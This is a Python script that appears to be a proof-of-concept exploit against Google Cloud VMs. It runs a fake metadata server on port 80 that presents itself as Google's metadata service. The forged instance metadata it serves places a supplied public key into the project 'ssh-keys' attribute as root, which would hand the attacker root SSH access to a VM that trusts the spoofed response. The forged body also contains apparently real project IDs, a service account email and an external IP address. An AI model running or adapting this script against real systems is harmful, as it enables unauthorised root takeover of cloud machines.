#!/usr/bin/env python3

import sys
import http.server
import socketserver
from urllib.parse import urlparse
from urllib.parse import parse_qs

class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Metadata-Flavor", "Google")
        self.send_header("Content-type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(bytes(body, "utf-8"))

if __name__ == "__main__":
    if len(sys.argv) != 2:
       print("Usage: %s id_rsa.pub"%(sys.argv[0]))
       sys.exit(1)
    with open(sys.argv[1],mode='r') as f:
       ssh = f.read().strip()

    body = '{"instance":{"attributes":{},"cpuPlatform":"Intel Haswell","description":"","disks":[{"deviceName":"test-instance-1","index":0,"interface":"SCSI","mode":"READ_WRITE","type":"PERSISTENT"}],"guestAttributes":{},"hostname":"test-instance-1.us-central1-a.c.gcp-experiments-20200608.internal","id":7015181712655481713,"image":"projects/debian-cloud/global/images/debian-10-buster-v20200618","legacyEndpointAccess":{"0.1":0,"v1beta1":0},"licenses":[{"id":"5543610867827062957"}],"machineType":"projects/747024478252/machineTypes/f1-micro","maintenanceEvent":"NONE","name":"test-instance-1","networkInterfaces":[{"accessConfigs":[{"externalIp":"35.209.180.239","type":"ONE_TO_ONE_NAT"}],"dnsServers":["169.254.169.254"],"forwardedIps":[],"gateway":"10.128.0.1","ip":"10.128.0.2","ipAliases":[],"mac":"42:01:0a:80:00:02","mtu":1460,"network":"projects/747024478252/networks/default","subnetmask":"255.255.240.0","targetInstanceIps":[]}],"preempted":"FALSE","remainingCpuTime":-1,"scheduling":{"automaticRestart":"TRUE","onHostMaintenance":"MIGRATE","preemptible":"FALSE"},"serviceAccounts":{"747024478252-compute@developer.gserviceaccount.com":{"aliases":["default"],"email":"747024478252-compute@developer.gserviceaccount.com","scopes":["https://www.googleapis.com/auth/devstorage.read_only","https://www.googleapis.com/auth/logging.write","https://www.googleapis.com/auth/monitoring.write","https://www.googleapis.com/auth/servicecontrol","https://www.googleapis.com/auth/service.management.readonly","https://www.googleapis.com/auth/trace.append"]},"default":{"aliases":["default"],"email":"747024478252-compute@developer.gserviceaccount.com","scopes":["https://www.googleapis.com/auth/devstorage.read_only","https://www.googleapis.com/auth/logging.write","https://www.googleapis.com/auth/monitoring.write","https://www.googleapis.com/auth/servicecontrol","https://www.googleapis.com/auth/service.management.readonly","https://www.googleapis.com/auth/trace.append"]}},"tags":[],"virtualClock":{"driftToken":"0"},"zone":"projects/747024478252/zones/us-central1-a"},"oslogin":{"authenticate":{"sessions":{}}},"project":{"attributes":{"enable-guest-attributes":"TRUE","enable-osconfig":"TRUE","osconfig-log-level":"debug","ssh-keys":"root:'+ssh+'"},"numericProjectId":747024478252,"projectId":"gcp-experiments-20200608"}}'

    my_server = socketserver.TCPServer(("", 80), MyHttpRequestHandler)

    # Star the server
    my_server.serve_forever()
